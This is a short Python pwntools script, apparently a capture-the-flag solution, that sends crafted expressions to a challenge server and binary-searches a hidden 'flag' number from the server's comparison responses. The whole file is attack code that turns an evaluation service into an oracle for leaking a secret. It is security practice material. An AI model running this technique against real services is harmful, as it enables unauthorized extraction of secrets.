from pwn import *


def connect():
    r = remote('wolf.chal.pwning.xxx',6808)
    return r



def doCompare(n):
    r = remote('wolf.chal.pwning.xxx',6808)
    payload = "if (flag = %d) = true then 0\n"%(n)
    payload =  payload + "else if (flag < %d) = true then 1\n"%(n)
    payload =  payload + "else 2\n" + " "*2048

    r.send(payload)
    data = r.recv(100)
    print data
    r.close()
    return data[0]

def BinarySearch():
    end = 10**90
    start = 0

    #start = 155924442406448791952071508005867319320207161537917133772976476023496170105773827149870
    #end = 155924442406448791952071508005867319320207161537917133772976476023496205479520228816713
    while start <= end:
        mid = (start+end)//2
      
        print "    Searching %d to %d and %d\n" % (start,end,mid)
        k = doCompare(mid)
        
        if k=='0':
            return mid
        elif k=='1':
            end = mid - 1
        elif k=='2':
            start = mid +1

    return "Noop"
print "[+] start BinarySearch"
answer = BinarySearch()
print answer
